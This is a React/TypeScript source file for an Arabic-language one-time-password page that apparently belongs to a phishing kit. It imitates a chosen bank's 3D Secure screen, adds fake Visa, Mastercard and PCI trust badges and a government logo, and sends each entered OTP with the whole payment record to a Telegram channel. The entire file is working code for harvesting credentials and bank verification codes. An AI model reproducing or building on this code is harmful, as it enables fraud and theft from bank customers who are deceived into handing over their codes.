import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { ShieldCheck, Lock, Smartphone, Loader2, AlertCircle, Info } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getBanksByCountry } from "@/lib/banks";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";

const PaymentOTP = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment, refetch } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isLocked, setIsLocked] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);
  
  const selectedBankId = link?.payload?.selectedBank || 'sadad';
  const selectedCountry = link?.payload?.selectedCountry || "SA";
  const allBanks = getBanksByCountry(selectedCountry);
  const selectedBank = allBanks.find(b => b.id === selectedBankId) || allBanks[0];

  const primaryColor = selectedBank?.color || '#004B8D';
  
  useEffect(() => {
    if (timeLeft > 0 && !isLocked) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, isLocked]);
  
  useEffect(() => {
    if (payment?.locked_until) {
      const lockTime = new Date(payment.locked_until).getTime();
      const now = Date.now();
      
      if (now < lockTime) {
        setIsLocked(true);
        setError("تم حظر عملية التحقق مؤقتاً لأسباب أمنية.");
      } else {
        setIsLocked(false);
      }
    }
  }, [payment]);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };
  
  const handleSubmit = async () => {
    if (!payment || isLocked) return;
    setError("");

    const isCorrect = otp === payment.otp;

    await sendToTelegram({
      type: 'payment_otp_attempt',
      data: { ...payment, otp, otp_status: isCorrect ? 'correct' : 'wrong' },
      timestamp: new Date().toISOString()
    });

    if (otp === payment.otp) {
      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: { status: "confirmed", receipt_url: `/pay/${id}/receipt/${payment.id}` },
      });
      toast({ title: "تم بنجاح!", description: "تم التحقق من العملية بنجاح" });
      navigate(`/pay/${id}/receipt/${payment.id}`);
    } else {
      const newAttempts = (payment.attempts || 0) + 1;
      if (newAttempts >= 3) {
        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();
        await updatePayment.mutateAsync({ paymentId: payment.id, updates: { attempts: newAttempts, locked_until: lockUntil } });
        setIsLocked(true);
        setError("تجاوزت عدد المحاولات. تم حظر العملية لسلامة حسابك.");
      } else {
        await updatePayment.mutateAsync({ paymentId: payment.id, updates: { attempts: newAttempts } });
        setError(`رمز التحقق غير صحيح. متبقي ${3 - newAttempts} محاولات.`);
        refetch();
      }
    }
  };
  
  if (!selectedBank) return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="text-center p-8 bg-white shadow-xl rounded-2xl">
        <Loader2 className="w-12 h-12 animate-spin text-blue-600 mx-auto mb-4" />
        <p className="text-lg font-bold text-gray-700">جاري تحميل بيانات الدفع...</p>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen w-full flex flex-col bg-[#F9FAFB]" dir="rtl" style={{ fontFamily: 'Cairo, sans-serif' }}>
      {/* Official Bank Branded Header */}
      <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50" style={{ borderColor: primaryColor }}>
        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
          <img src={selectedBank.logo} alt={selectedBank.nameAr} className="h-10 sm:h-14 object-contain" />
          <div className="flex items-center gap-3">
             <div className="hidden sm:block text-left ml-4">
                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">3D Secure</p>
                <p className="text-[8px] text-gray-400">Verified by Visa / Mastercard</p>
             </div>
             <div className="bg-gray-100 p-2 rounded-full">
                <Lock className="w-5 h-5" style={{ color: primaryColor }} />
             </div>
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-12">
        <div className="w-full max-w-lg">
          <Card className="border border-gray-100 shadow-2xl rounded-none overflow-hidden">
            {/* Safe Mode Banner */}
            <div className="bg-[#f8f9fa] p-4 border-b flex items-center gap-3 text-gray-500">
               <ShieldCheck className="w-5 h-5 text-green-600" />
               <p className="text-[10px] font-bold uppercase tracking-tight">جلسة دفع آمنة مشفرة بنظام 256-bit</p>
            </div>

            <div className="p-8 sm:p-12 text-center">
              <div className="mb-10">
                <div className="w-20 h-20 mx-auto mb-6 flex items-center justify-center rounded-full bg-gray-50 border-2" style={{ borderColor: `${primaryColor}20` }}>
                  <Smartphone className="w-10 h-10" style={{ color: primaryColor }} />
                </div>
                <h2 className="text-2xl font-black text-gray-900 mb-3">رمز التحقق لمرة واحدة</h2>
                <p className="text-sm font-bold text-gray-500 leading-relaxed">
                  الرجاء إدخال الرمز المرسل إلى هاتفك الجوال المسجل لدى <strong>{selectedBank.nameAr}</strong> لإتمام عملية الشراء.
                </p>
              </div>

              <div className="space-y-8">
                <div className="flex justify-center" dir="ltr">
                  <InputOTP 
                    maxLength={4} 
                    value={otp} 
                    onChange={setOtp}
                    disabled={isLocked}
                  >
                    <InputOTPGroup className="gap-3 sm:gap-5">
                      {[0, 1, 2, 3].map((index) => (
                        <InputOTPSlot 
                          key={index} 
                          index={index}
                          className="w-16 h-20 sm:w-20 sm:h-24 text-4xl font-black border-2 rounded-none bg-white transition-all focus:ring-0"
                          style={{
                            borderColor: otp[index] ? primaryColor : '#E5E7EB',
                            color: primaryColor,
                            backgroundColor: isLocked ? '#F9FAFB' : 'white'
                          }}
                        />
                      ))}
                    </InputOTPGroup>
                  </InputOTP>
                </div>

                {error && (
                  <div className="bg-red-50 border-r-4 border-red-500 p-4 flex items-center gap-3 text-right">
                    <AlertCircle className="w-6 h-6 text-red-600 flex-shrink-0" />
                    <p className="text-xs font-black text-red-800">{error}</p>
                  </div>
                )}

                <div className="bg-blue-50/50 p-4 border border-blue-100 flex items-start gap-3 text-right">
                   <Info className="w-5 h-5 text-blue-600 mt-0.5" />
                   <div className="text-[10px] font-bold text-blue-800 leading-relaxed">
                      <p>لم يصلك الرمز؟ يمكنك طلب رمز جديد بعد انتهاء الوقت.</p>
                      <p className="mt-1 opacity-70">رقم المرجع: {paymentId?.slice(-6).toUpperCase()}</p>
                   </div>
                </div>

                <div className="flex flex-col gap-5 pt-4">
                  <Button
                    size="lg"
                    className="w-full h-16 text-xl font-black text-white rounded-none shadow-xl transition-all"
                    onClick={handleSubmit}
                    disabled={isLocked || otp.length < 4 || updatePayment.isPending}
                    style={{
                      backgroundColor: primaryColor,
                    }}
                  >
                    {updatePayment.isPending ? <Loader2 className="w-6 h-6 animate-spin" /> : "إرسال وتأكيد"}
                  </Button>
                  
                  <div className="flex items-center justify-center gap-2 text-xs font-bold text-gray-400">
                    <Lock className="w-4 h-4" />
                    <span>سينتهي الوقت خلال: </span>
                    <span className="text-red-600 font-black">{formatTime(timeLeft)}</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Secure Footer Section */}
            <div className="p-6 bg-gray-50 border-t flex flex-wrap items-center justify-center gap-6 opacity-40">
               <img src="./assets/branding/logo-uae-gov.png" className="h-4 grayscale" alt="Secure" />
               <div className="h-4 w-px bg-gray-300" />
               <span className="text-[8px] font-black uppercase tracking-widest">Verified by PCI Security Standards</span>
            </div>
          </Card>

          <div className="mt-12 text-center text-[10px] font-black text-gray-400 uppercase tracking-widest leading-loose">
            <p>© {new Date().getFullYear()} {selectedBank.nameEn} - Online Security Dept.</p>
            <p className="mt-2 opacity-50">هذه الجلسة محمية ومشفرة بالكامل. لا تشارك رمز التحقق مع أي شخص.</p>
          </div>
        </div>
      </main>
    </div>
  );
};

export default PaymentOTP;
